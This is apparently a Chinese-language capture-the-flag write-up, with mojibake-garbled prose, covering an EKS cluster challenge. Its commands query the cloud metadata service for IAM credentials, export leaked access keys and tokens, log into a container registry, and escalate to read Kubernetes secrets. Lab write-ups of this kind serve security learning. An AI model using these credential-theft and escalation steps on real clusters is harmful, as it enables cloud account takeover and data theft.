<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228150321381.png" alt="image-20231228150321381"></p>
<p>æŸ¥çœ‹æ‰€æœ‰iamè§’è‰²</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/iam/security-credentials</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228151224987.png" alt="image-20231228151224987"></p>
<p>æŸ¥çœ‹è§’è‰²çš„ä¸´æ—¶å‡­æ®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228155616853.png" alt="image-20231228155616853"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;AccessKeyId&quot;</span><span class="punctuation">:</span><span class="string">&quot;ASIA2AVYNEVMXAE7X7P7&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Expiration&quot;</span><span class="punctuation">:</span><span class="string">&quot;2023-12-28 09:34:59+00:00&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SecretAccessKey&quot;</span><span class="punctuation">:</span><span class="string">&quot;3Z7ATVQPlzcBh9hQ0FiYOtbIT9g0jq/tv7yoSVl4&quot;</span><span class="punctuation">,</span><span class="attr">&quot;SessionToken&quot;</span><span class="punctuation">:</span><span class="string">&quot;FwoGZXIvYXdzEEIaDGhraua/WnoiQClw/iK3AVpdk0hCdgAvcjERWcmwa+jJMsRW+Z/10iYlnh3PefD1gHZdvn/mDSKN2GdegizrmqYQ8pO7QxdhErdearkp7OnZdYZe0X1eOTj0BO0qHkXPow+VXXtOrmz22L+E+iN/rNaGd1UKt8FUhfrx/sBA0o81h5jtQwDNJo8y/ZdJIa+iYteGISMrK9zaXUIXhrIcXBBEvDz7F0wBgnB8fGfn78PgKqikUe+NYPmNGIKT2cRALbxbuj/YkCiz5rSsBjItmbQeo/a24SgZYnNOzLoT424BJu9wE0QQQhXntjpyR6Nl8X4AKeG7lVugrQ0m&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>å°†keyä¿¡æ¯å¯¼å…¥ç¯å¢ƒå˜é‡ä¾¿äºä½¿ç”¨</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=ASIA2AVYNEVMXAE7X7P7</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=3Z7ATVQPlzcBh9hQ0FiYOtbIT9g0jq/tv7yoSVl4</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=FwoGZXIvYXdzEEIaDGhraua/WnoiQClw/iK3AVpdk0hCdgAvcjERWcmwa+jJMsRW+Z/10iYlnh3PefD1gHZdvn/mDSKN2GdegizrmqYQ8pO7QxdhErdearkp7OnZdYZe0X1eOTj0BO0qHkXPow+VXXtOrmz22L+E+iN/rNaGd1UKt8FUhfrx/sBA0o81h5jtQwDNJo8y/ZdJIa+iYteGISMrK9zaXUIXhrIcXBBEvDz7F0wBgnB8fGfn78PgKqikUe+NYPmNGIKT2cRALbxbuj/YkCiz5rSsBjItmbQeo/a24SgZYnNOzLoT424BJu9wE0QQQhXntjpyR6Nl8X4AKeG7lVugrQ0m</span><br></pre></td></tr></table></figure>

<h4 id="3-2-æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹è§’è‰²ä¿¡æ¯"><a href="#3-2-æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹è§’è‰²ä¿¡æ¯" class="headerlink" title="3.2 æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹è§’è‰²ä¿¡æ¯"></a>3.2 æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹è§’è‰²ä¿¡æ¯</h4><p>æŸ¥çœ‹è´¦æˆ·ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>arn:</strong> è¡¨ç¤ºAmazonèµ„æºåç§°çš„å‰ç¼€ã€‚</li>
<li><strong>aws:</strong> è¡¨ç¤ºARNçš„å‘½åç©ºé—´ï¼ŒæŒ‡ç¤ºè¿™æ˜¯AWSèµ„æºã€‚</li>
<li><strong>sts:</strong> æŒ‡ç¤ºAWS Security Token Service (STS)ã€‚</li>
<li><strong>688655246681:</strong> AWSè´¦æˆ·å·ç ï¼Œå”¯ä¸€æ ‡è¯†AWSè´¦æˆ·ã€‚</li>
<li><strong>assumed-role:</strong> è§’è‰²æ‰®æ¼”ï¼ˆAssume Roleï¼‰æ“ä½œçš„æ ‡è¯†ç¬¦ã€‚</li>
<li><strong>eks-challenge-cluster-nodegroup-NodeInstanceRole:</strong> æ‰®æ¼”çš„IAMè§’è‰²çš„åç§°ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒæ˜¯<code>eks-challenge-cluster-nodegroup-NodeInstanceRole</code>ã€‚</li>
<li><strong>i-0cb922c6673973282:</strong> ä¸è§’è‰²ç›¸å…³è”çš„å®ä¾‹çš„IDã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒæ˜¯<code>i-0cb922c6673973282</code>ã€‚</li>
</ul>
<p>æŸ¥çœ‹è§’è‰²æƒé™</p>
<p>ä½¿ç”¨githubè„šæœ¬æŸ¥çœ‹ï¼Œè¯·è§å‚è€ƒæ–‡çŒ®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account ARN : arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282</span><br><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account Id  : 688655246681</span><br><span class="line">2023-12-28 16:27:00,284 - 37842 - [INFO] -- Account Path: assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282</span><br><span class="line">2023-12-28 16:27:02,885 - 37842 - [INFO] Attempting common-service describe / list brute force.</span><br><span class="line">2023-12-28 16:27:05,495 - 37842 - [INFO] -- ecr.get_authorization_token() worked!</span><br><span class="line">2023-12-28 16:27:05,751 - 37842 - [INFO] -- ecr.describe_repositories() worked!</span><br><span class="line">2023-12-28 16:27:23,679 - 37842 - [INFO] -- dynamodb.describe_endpoints() worked!</span><br><span class="line">2023-12-28 16:27:31,811 - 37842 - [INFO] -- sts.get_caller_identity() worked!</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æœåŠ¡å™¨åœ°åŒºå’Œä»“åº“å</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods -o yaml|grep image</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">image:</span> <span class="number">688655246681.</span><span class="string">dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span><br><span class="line"> <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line"> <span class="attr">image:</span> <span class="string">sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3</span></span><br><span class="line"> <span class="attr">imageID:</span> <span class="number">688655246681.</span><span class="string">dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°åœ°åŒºä¸ºus-west-1ï¼Œä»“åº“åä¸ºcentral_repo-aaf4a7c</p>
<p>æŸ¥çœ‹é•œåƒä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr describe-repositories --repository-names central_repo-aaf4a7c --region us-west-1</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;repositories&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;repositoryArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;registryId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;repositoryName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;repositoryUri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;createdAt&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-11-01T13:31:27+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;imageTagMutability&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MUTABLE&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;imageScanningConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;scanOnPush&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;encryptionConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;encryptionType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AES256&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="3-3-craneç™»é™†å¹¶å¯¹é•œåƒè¿›è¡Œè§£æ"><a href="#3-3-craneç™»é™†å¹¶å¯¹é•œåƒè¿›è¡Œè§£æ" class="headerlink" title="3.3 craneç™»é™†å¹¶å¯¹é•œåƒè¿›è¡Œè§£æ"></a>3.3 craneç™»é™†å¹¶å¯¹é•œåƒè¿›è¡Œè§£æ</h4><p>è·å–ç™»é™†tokenï¼Œé€šè¿‡dockerä½¿ç”¨tokenè¿›è¡Œç™»é™†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr get-login-password|crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u AWS --password-stdin</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡craneè¿›è¡Œè¿œç¨‹åˆ†æ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span><br></pre></td></tr></table></figure>

<p>åœ¨è®°å½•ä¸­è·å–åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;architecture&quot;:&quot;amd64&quot;,&quot;config&quot;:&#123;&quot;Env&quot;:[&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;],&quot;Cmd&quot;:[&quot;/bin/sleep&quot;,&quot;3133337&quot;],&quot;ArgsEscaped&quot;:true,&quot;OnBuild&quot;:null&#125;,&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;history&quot;:[&#123;&quot;created&quot;:&quot;2023-07-18T23:19:33.538571854Z&quot;,&quot;created_by&quot;:&quot;/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / &quot;&#125;,&#123;&quot;created&quot;:&quot;2023-07-18T23:19:33.655005962Z&quot;,&quot;created_by&quot;:&quot;/bin/sh -c #(nop)  CMD [\&quot;sh\&quot;]&quot;,&quot;empty_layer&quot;:true&#125;,&#123;&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;created_by&quot;:&quot;RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge&#123;the_history_of_container_images_could_reveal_the_secrets_to_the_future&#125; ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit&quot;,&quot;comment&quot;:&quot;buildkit.dockerfile.v0&quot;&#125;,&#123;&quot;created&quot;:&quot;2023-11-01T13:32:07.782534085Z&quot;,&quot;created_by&quot;:&quot;CMD [\&quot;/bin/sleep\&quot; \&quot;3133337\&quot;]&quot;,&quot;comment&quot;:&quot;buildkit.dockerfile.v0&quot;,&quot;empty_layer&quot;:true&#125;],&quot;os&quot;:&quot;linux&quot;,&quot;rootfs&quot;:&#123;&quot;type&quot;:&quot;layers&quot;,&quot;diff_ids&quot;:[&quot;sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f&quot;,&quot;sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-ç¬¬å››éƒ¨åˆ†"><a href="#4-ç¬¬å››éƒ¨åˆ†" class="headerlink" title="4. ç¬¬å››éƒ¨åˆ†"></a>4. ç¬¬å››éƒ¨åˆ†</h2><p>åœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œæ‚¨å·²è·å–èŠ‚ç‚¹çš„æœåŠ¡å¸æˆ·å‡­æ®ã€‚ä¸ºäº†ä¾¿äºå°†æ¥å‚è€ƒï¼Œæ‚¨å¯ä»¥åœ¨ pod ä¸­æ–¹ä¾¿åœ°è®¿é—®è¿™äº›å‡­æ®ã€‚</p>
<p>æœ‰è¶£çš„äº‹å®ï¼šæ­¤æŒ‘æˆ˜ä¸­çªå‡ºæ˜¾ç¤ºçš„é”™è¯¯é…ç½®å¾ˆå¸¸è§ï¼Œå¹¶ä¸”ç›¸åŒçš„æŠ€æœ¯å¯ä»¥åº”ç”¨äºä»»ä½•ä¸å¼ºåˆ¶å®æ–½ IMDSv2 è·ƒç‚¹é™åˆ¶çš„ EKS é›†ç¾¤ã€‚</p>
<h3 id="Pod-Break"><a href="#Pod-Break" class="headerlink" title="Pod Break"></a>Pod Break</h3><p>Youâ€™re inside a vulnerable pod on an EKS cluster. Your podâ€™s service-account has no permissions. Can you navigate your way to access the EKS Nodeâ€™s privileged service-account?</p>
<p>æˆ‘ä»¬ç°åœ¨çš„nodeæ²¡æœ‰ä»»ä½•æƒé™ï¼Œæˆ‘æƒ³è¦çš„æ˜¯èƒ½å¤Ÿè®¿é—®secretså’Œserviceaccountçš„æƒé™ï¼Œè¯¥å¦‚ä½•è¿›è¡Œææƒå‘¢ã€‚awså…è®¸IAMç”¨æˆ·åˆ›å»ºä¸´æ—¶è®¿é—®å‡­æ®å¯¹é›†ç¾¤è¿›è¡Œè®¿é—®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æå‡æƒé™ã€‚</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/secrets.png" alt="secrets"></p>
<h4 id="4-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"><a href="#4-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™" class="headerlink" title="4.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"></a>4.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list   </span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228194404583.png" alt="image-20231228194404583"></p>
<p>ä»€ä¹ˆæƒé™éƒ½æ²¡æœ‰</p>
<h4 id="4-2-æ›´æ–°token"><a href="#4-2-æ›´æ–°token" class="headerlink" title="4.2 æ›´æ–°token"></a>4.2 æ›´æ–°token</h4><p>é¦–å…ˆè¦çŸ¥é“æˆ‘ä»¬åœ¨é›†ç¾¤ä¸­æ˜¯ä»€ä¹ˆè§’è‰²</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸»è¦æƒ³çŸ¥é“çš„æ˜¯é›†ç¾¤åç§°ï¼šeks-challenge-cluster</p>
<p>æ¥ä¸‹æ¥æŸ¥çœ‹token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws eks get-token --cluster-name eks-challenge-cluster --region us-west-1</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;kind&quot;:</span> <span class="string">&quot;ExecCredential&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;apiVersion&quot;:</span> <span class="string">&quot;client.authentication.k8s.io/v1beta1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;spec&quot;:</span> &#123;&#125;,</span><br><span class="line">    <span class="attr">&quot;status&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;expirationTimestamp&quot;:</span> <span class="string">&quot;2023-12-28T11:40:29Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;token&quot;:</span> <span class="string">&quot;k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1ZVzdYTkhPNyUyRjIwMjMxMjI4JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzEyMjhUMTEyNjI5WiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRVVhREl0d0s1NzlDYkd1RGQ0Z21TSzNBYnVZeHZZU1JBRGthUG01a0h5WW5IYyUyQjVUWVhLNjBpaVZwb3hHSUo4NTZOalRHZXBhUHVIVEtYTE9aZkN6TzBlMHglMkYzZ1RPM1loR0RNWnp4TWNpVGJRS2V4T05OJTJGd1VOR2ZVSGQ0aEV1TCUyRk9GNCUyRjh0Qkd1MVl1bjdGVCUyRkN4JTJCY0NQZFFDUW02YlZUREU1Zjc5Y0tRSUNBNTdkbUluQ014MmhNZUpiTEQyM3pNVmtGWVBRZDJwWTRWQkF6d2o2NkRNNTBOS1J4RVJpMzlRYXgyYTVla2dsa1VJWFBUNUkyUyUyQktndWhpblVKeUVMYnYyMkVXdWpTaTVzTFdzQmpJdHJCUTdzWjdGd2NMcTRiQUc3Z0o1c05vZ2FLdWpPcTk0ZTZ5MmRaOW9ESlZJZ3FkeDlqR2JtNFZBZ0NobSZYLUFtei1TaWduYXR1cmU9MmY0MjBlY2JkMjNlYmRmZGRlN2QxOGY3MWU4NWEzYjQ2NTllYzAxNTM5NWI1N2RhMjM2NDczOTYyOTVhYmE4Nw&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨token</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TOKEN1=$(aws  eks get-token --cluster-name eks-challenge-cluster --region us-west-1 | jq  -r .status.token)</span><br><span class="line">kubectl get pods --token=<span class="variable">$TOKEN1</span></span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸€ä¸‹æˆ‘ä»¬ç°åœ¨çš„æƒé™</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl auth can-i --list --token=<span class="variable">$TOKEN1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228194208202.png" alt="image-20231228194208202"></p>
<p>å‘ç°å·²ç»å¯ä»¥æŸ¥çœ‹serviceaccountå’Œsecretsäº†ä»è€Œè·å–flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get secrets --token=<span class="variable">$TOKEN1</span> -o yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">flag:</span> <span class="string">d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-11-01T12:27:57Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">node-flag</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge4</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;883574&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">26461a29-ec72-40e1-adc7-99128ce664f7</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="5-ç¬¬äº”éƒ¨åˆ†"><a href="#5-ç¬¬äº”éƒ¨åˆ†" class="headerlink" title="5. ç¬¬äº”éƒ¨åˆ†"></a>5. ç¬¬äº”éƒ¨åˆ†</h2><h3 id="Container-Secrets-Infrastructure"><a href="#Container-Secrets-Infrastructure" class="headerlink" title="Container Secrets Infrastructure"></a>Container Secrets Infrastructure</h3><p>Youâ€™ve successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the <em>s3access-sa</em> service account, and get the flag?</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/5.png" alt="5"></p>
<h4 id="5-1-IAMç­–ç•¥"><a href="#5-1-IAMç­–ç•¥" class="headerlink" title="5.1 IAMç­–ç•¥"></a>5.1 IAMç­–ç•¥</h4><p>å…è®¸çš„åŠ¨ä½œï¼šåˆ—å‡ºs3 bucketä¸­çš„èµ„æºã€è·å–ç‰¹å®šs3 bucketä¸­çš„èµ„æº</p>
<p>å…è®¸çš„èµ„æºï¼šarn:aws:s3:::challenge-flag-bucket-3ff1ae2ã€arn:aws:s3:::challenge-flag-bucket-3ff1ae2&#x2F;flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Policy&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;s3:GetObject&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Resource&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

